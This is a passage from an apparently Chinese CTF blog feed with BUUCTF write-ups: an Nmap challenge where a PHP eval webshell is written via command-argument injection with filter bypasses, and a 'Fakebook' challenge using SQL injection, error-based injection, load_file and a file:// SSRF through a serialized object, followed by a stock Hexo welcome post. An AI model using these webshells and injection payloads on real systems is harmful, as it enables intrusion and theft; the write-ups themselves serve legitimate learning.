class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;  -oN pass.php<br></code></pre></td></tr></table></figure><p>响应结果:<br><img src="/images/2023-08-22_Nmap/image-20230822105623631.png" alt="image-20230822105623631"></p><p>发现输入的结果可能被过滤,采用第二个payload试试<br>payload2:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#x27;pass&#x27;]);&lt;/script&gt; -oN pass.php<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822105915275.png" alt="image-20230822105915275"></p><p>依然被过滤</p><p>4.现在就要一个个进行判断，寻找被过滤的内容:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt; <br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822115002077.png" alt="image-20230822115002077"></p><p>存在黑名单内容</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822115127287.png" alt="image-20230822115127287"></p><p>由于该文件不可被识别，所以就无法显示内容</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?php<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822115207663.png" alt="image-20230822115207663"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?ph<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822115311166.png" alt="image-20230822115311166"></p><p>所以过滤的内容为php,我们需要绕过php判断</p><p><strong>php一句话木马的构造</strong></p><p>可以解析php文件的后缀名:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">.php2<br>.php3<br>.php4<br>.php5<br>.phtml<br></code></pre></td></tr></table></figure><p>phtml:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;666&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">666<br></code></pre></td></tr></table></figure><p>php短标签：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;? echo &#x27;123&#x27;;?&gt;  #前提是开启配置参数short_open_tags=on<br>&lt;?=(表达式)?&gt;  等价于 &lt;?php echo (表达式)?&gt;  #不需要开启参数设置<br>&lt;% echo &#x27;123&#x27;;%&gt;   #开启配置参数asp_tags=on，并且只能在7.0以下版本使用<br>&lt;script language=&quot;php&quot;&gt;echo &#x27;123&#x27;; &lt;/script&gt; #不需要修改参数开关，但是只能在7.0以下可用。<br></code></pre></td></tr></table></figure><p>测试:<br><? echo '123';?> ：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;888&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">888<br></code></pre></td></tr></table></figure><?=(表达式)?><p>  等价于 <?php echo (表达式)?> :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><br><span class="hljs-string">&quot;flag&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flag<br></code></pre></td></tr></table></figure><p>&lt;% echo ‘123’;%&gt; :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;%<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&quot;</span>;<br>%&gt;<br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flag<br></code></pre></td></tr></table></figure><p>使用短标签绕过php:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;? echo &#x27;123&#x27;;?&gt;  =&gt; &lt;? echo @eval($_POST[&#x27;pass&#x27;]);?&gt;<br>&lt;?=(表达式)?&gt;  =&gt; &lt;?= @eval($_POST[&#x27;pass&#x27;]);?&gt;<br>&lt;% echo &#x27;123&#x27;;%&gt; =&gt; &lt;% echo @eval($_POST[&#x27;pass&#x27;]);%&gt;<br></code></pre></td></tr></table></figure><p>测试:</p><? echo @eval($_POST['pass']);?><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span> <br><span class="hljs-keyword">echo</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;dir&quot;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出：</p><p><img src="/images/2023-08-22_Nmap/image-20230822125459893.png" alt="image-20230822125459893"></p><?= @eval($_POST['pass'];?><p>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;dir&quot;</span>));<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出结果：</p><p><img src="/images/2023-08-22_Nmap/image-20230822125704414.png" alt="image-20230822125704414"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?= @eval($_POST[&#x27;pass&#x27;]);?&gt;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822130015713.png" alt="image-20230822130015713"></p><p>绕过</p><p>构造写文件输出payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?= @eval($_POST[&#x27;pass&#x27;]);?&gt; -oG pass.phtml<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822131843981.png" alt="image-20230822131843981"></p><p>发现成功绕过:<br>访问pass.phtml:</p><p>由于当于oG输出的文件都在当前文件夹下所以为:<a href="http://bd9c6623-f4d3-4f23-bf75-6978d1a50003.node4.buuoj.cn:81/pass.html">http://bd9c6623-f4d3-4f23-bf75-6978d1a50003.node4.buuoj.cn:81/pass.html</a></p><p><img src="/images/2023-08-22_Nmap/image-20230822132212701.png" alt="image-20230822132212701"></p><p>发现当前网站下没有该文件，从之前的[BUUCTF 2018]Online Tool中获取的经验，nmap可能和escapeshellarg()与escapeshellcmd()配合使用，需要绕过这两个函数：使用空格和单引号,为了防止’pass’的单引号也被这两个函数过滤，我们这里使用”pass”:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">&#x27; &lt;?= @eval($_POST[&quot;pass&quot;]);?&gt; -oG pass.phtml &#x27;<br><br>&#x27; &lt;?= @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822132957714.png" alt="image-20230822132957714"></p><p>访问pass.phtml:<a href="http://bd9c6623-f4d3-4f23-bf75-6978d1a50003.node4.buuoj.cn:81/pass.phtml">http://bd9c6623-f4d3-4f23-bf75-6978d1a50003.node4.buuoj.cn:81/pass.phtml</a></p><p><img src="/images/2023-08-22_Nmap/image-20230822132932341.png" alt="image-20230822132932341"></p><p>使用webshell测试:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pass=system(&quot;ls&quot;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822133218223.png" alt="image-20230822133218223"></p><p>发现一个flag文件:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pass=system(&quot;cat /flag&quot;);<br></code></pre></td></tr></table></figure><p>返回结果:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt"># Nmap 6.47 scan initiated Tue Aug 22 05:28:38 2023 as: nmap -Pn -T4 -F --host-timeout 1000ms -oX xml/e0e2e -oG pass.phtml \ flag&#123;544d334f-80b2-44f8-a3b1-c8b312b0b484&#125;<br> \\<br># Nmap done at Tue Aug 22 05:28:39 2023 -- 0 IP addresses (0 hosts up) scanned in 0.27 seconds<br></code></pre></td></tr></table></figure><p>flag&#x3D;flag{544d334f-80b2-44f8-a3b1-c8b312b0b484}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_Fakebook1 题解</title>
    <link href="/2023/08/21/2023-08-20-Fakebook1/"/>
    <url>/2023/08/21/2023-08-20-Fakebook1/</url>
    
    <content type="html"><![CDATA[<h1 id="Fakebook1"><a href="#Fakebook1" class="headerlink" title="Fakebook1"></a>Fakebook1</h1><p>1.点击登陆界面join,申请一个用户:<br>admin,123,18,bai.com</p><p>2.登录网站后，点击admin,发现网址有注入点:</p><p><a href="http://1886ff85-240c-42c7-84f0-3fa2575c0bb9.node4.buuoj.cn:81/view.php?no=1">http://1886ff85-240c-42c7-84f0-3fa2575c0bb9.node4.buuoj.cn:81/view.php?no=1</a></p><p>no,应该是记录的编号，我们可以通过no进行注入</p><p>注册一个账户之后自动生成记录的编号，所以编号为自动递增型为int</p><p>3.随便注入no&#x3D;1’,网页响应有sql报错，所以该网页存在sql语句注入</p><p>4.猜测该网页使用了select * from where no &#x3D; </p><p>所以我们可以用1 union select 1,2,3;#</p><p>但是返回了no hacker,所以可能过滤了select</p><p>所以可以用</p><p>– 内联注释绕过<br>&#x2F;*!select *&#x2F;1，2，3，4;</p><p>5.爆字段:1 order by 4;#</p><p>当order by 5#时报错，所以最大字段数为4</p><p>6.使用-1 union&#x2F;*!select *&#x2F;1，2，3，4;</p><p>只有username返回值为2，所以只有第二个字段能够成功返回值</p><p>使用-1是为了使响应网址只返回我们select的内容</p><p>7.爆数据库:-1 union&#x2F;*!select *&#x2F;1,database(),3,4;</p><p>-1 union&#x2F;*!select *&#x2F;1,group_concat(database()),3,4;&#x2F;&#x2F;爆出所有数据库</p><p>uername爆出数据库为fakebook</p><p>只有一个数据库</p><p>8.爆表</p><p>-1 union&#x2F;*!select *&#x2F;1,group_concat(table_name) ,3,4 from information_schema.tables where table_schema</p><p>&#x3D; DATABASE();&#x2F;&#x2F;database()可以直接显示当前数据库，一般是只有一个数据库才可以用，否则就要指定数据库</p><p>username字段显示users表</p><p>9.爆字段</p><p>-1 union&#x2F;*!select *&#x2F;1,group_concat(column_name),3,4  from information_schema.COLUMNS where table_schema &#x3D; ‘fakebook’ and table_name &#x3D; ‘users’;</p><p>username字段显示no,username,passwd,data字段</p><p>data字段是之前没有看到过的，所以现在要查看字段的值</p><p>10.爆字段的值</p><p>-1 union&#x2F;*!select *&#x2F;1,group_concat(data),3,4 from users</p><p>username:爆出字段值:O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:13;s:4:”blog”;s:7:”bai.com”;} </p><p>这是一个序列化语句:表示有一个UserInfo类，这个类有参数name,age,blog</p><p>没有获得有用的信息，所以查看其他几个字段的内容</p><p>11.爆其他字段:</p><p>-1 union&#x2F;*!select *&#x2F;1,group_concat(no,username,passwd),3,4 from users</p><p>username爆出字段的值:1admin3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2</p><p>发现除了no和username字段其他为密文，进行解密:</p><p>3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2</p><p>发现解密失败，所以可能不是密文</p><p>12.查看网页的robots.txt文件，查看网页还允许我们查看的文件有哪些:</p><p><a href="http://f848876c-8f1f-4fec-bdf5-2a6496754020.node4.buuoj.cn:81/robots.txt">http://f848876c-8f1f-4fec-bdf5-2a6496754020.node4.buuoj.cn:81/robots.txt</a></p><p>获得一个user.php.bak文件，将它下载:</p><p>13.分析user.php.bak中的代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//UserInfo类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-comment">//有参申请类</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<span class="hljs-comment">//curl_init()函数用于初始化一个新的会话，可以用于获取网页地址、设置网页头信息等</span><br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>        <span class="hljs-comment">//curl_setopt — 设置一个cURL传输选项</span><br>        <span class="hljs-comment">//CURLOPT_URL: 这是你想用PHP取回的URL地址。你也可以在用curl_init()函数初始化时设置这个选项</span><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$httpCode</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br>    <span class="hljs-comment">//blog内容的处理</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;blog);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$blog</span> = <span class="hljs-variable language_">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>该代码展示了一个UserInFo的类的具体内容和参数，以便之后的序列化处理</p><p>14.由网页显示的内容得：</p><p><strong>the contents of his&#x2F;her blog</strong></p><p><strong>下面一块不可见区域为，我们输入的blog（博客）的内容，所以猜测如果我们输入的博客内容为flag.php,则会显示该文件的内容，但是我们要知道网站flag.php的具体文件路径</strong></p><p><strong>网页中源代码的描述这块内容:</strong><br><strong>src &#x3D; ‘data:text&#x2F;html;base64,PCF………’</strong></p><p><strong>所以data的类型是text文本型</strong></p><p>所以网页的源地址传输为data,猜测可能利用的是第四个字段data中的内容:</p><p>O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:13;s:4:”blog”;s:7:”bai.com”;} </p><p>data字段中的内容是经过序列化处理的结果</p><p>15.利用报错注入获取flag.php的文件路径:</p><p>or(updatexml(1,concat(‘<del>‘,(SELECT(load_file(“flag.php”)),’</del>‘),1))#</p><p>or(updatexml(1,concat(0x7e,(SELECT(database())),0x7e),1))#</p><p>通过筛选，发现网站过滤了’x’</p><p>所以用字符’<del>‘:or(updatexml(1,concat(‘</del>‘,(SELECT(load_file(“flag.php”)),’~’),1))#</p><p>返回报错内容:</p><p>[*] query error! (Incorrect parameter count in the call to native function ‘updatexml’)</p><p><strong>Fatal error</strong>:  Call to a member function fetch_assoc() on boolean in <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;db.php</strong> on line <strong>66</strong></p><p>所以我们猜测flag.php的地址为&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p><p><strong>其实，随便输入一个错误的参数都会报错显示地址&#x2F;var&#x2F;www&#x2F;html&#x2F;db.php，所以一定要注意任何报错信息</strong></p><p>16.所以blog&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p><p>所以要爆出该文件的内容:select load_file(“文件路径”);可以获取该文件的内容</p><p>-1 union&#x2F;*!select *&#x2F;1,load_file(“&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”),3,4</p><p><strong>username没有返回内容，但是页面产生了响应，说明username所显示的内容，不符合该字段所能显示的内容的格式，可以通过查看网页源代码，查看本来应该在该字段中显示的内容：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs html">    <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;table&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span><br>                username<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span><br>                age<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span><br>                blog<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><br>                <span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$flag = &quot;flag&#123;ab61868d-16df-4976-93c7-8980c7fbc7be&#125;&quot;;</span><br><span class="hljs-meta">exit(0);</span><br><span class="hljs-meta">            &lt;/td&gt;</span><br><span class="hljs-meta">            &lt;td&gt;</span><br><span class="hljs-meta">                &lt;br /&gt;</span><br><span class="hljs-meta">&lt;b&gt;Notice&lt;/b&gt;:  Trying to get property of non-object in &lt;b&gt;/var/www/html/view.php&lt;/b&gt; on line &lt;b&gt;53&lt;/b&gt;&lt;br /&gt;</span><br><span class="hljs-meta">            &lt;/td&gt;</span><br><span class="hljs-meta">            &lt;td&gt;</span><br><span class="hljs-meta">                &lt;br /&gt;</span><br><span class="hljs-meta">&lt;b&gt;Notice&lt;/b&gt;:  Trying to get property of non-object in &lt;b&gt;/var/www/html/view.php&lt;/b&gt; on line &lt;b&gt;56&lt;/b&gt;&lt;br /&gt;</span><br><span class="hljs-meta">            &lt;/td&gt;</span><br><span class="hljs-meta">        &lt;/tr&gt;</span><br><span class="hljs-meta">    &lt;/table&gt;</span><br></code></pre></td></tr></table></figure><p>所以flag为:</p><p>flag{ab61868d-16df-4976-93c7-8980c7fbc7be}</p><p>16.如果网站过滤了load_file(“路径”):</p><p>第四个字段data所显示的位置为:the contents of his&#x2F;her blog</p><p>该字段为将存储于数据库中的如O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:13;s:4:”blog”;s:7:”bai.com”;} 的内容取出，然后根据该data中blog的地址，访问出blog的内容，所以我们可以让它显示&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php的内容</p><p>假设它网页是对这个序列化的内容base-64加密然后访问，则我们也只需要让它访问序列化的data：</p><p>O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:13;s:4:”blog”;s:29:”file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”;}</p><p>payload:</p><p>-1 union&#x2F;*!select *&#x2F;1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:13;s:4:”blog”;s:29:”file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”；}’:</p><p><strong>the contents of his&#x2F;her blog,没有显示内容，可能依然为非该字段的格式内容，所以查看网页源代码:</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>the contents of his/her blog<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&#x27;100%&#x27;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&#x27;10em&#x27;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3sxOTUxNDdkZi1iN2NhLTQ1NjAtYmVjYi1kOTg1OTI4NTBmYzh9IjsNCmV4aXQoMCk7DQo=&#x27;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这个区域显示的内容为src所指向区域，所以点击src所指向的区域:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&#123;195147df-b7ca-4560-becb-d98592850fc8&#125;&quot;</span>;<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>得到flag.php的内容</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/08/21/hello-world/"/>
    <url>/2023/08/21/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
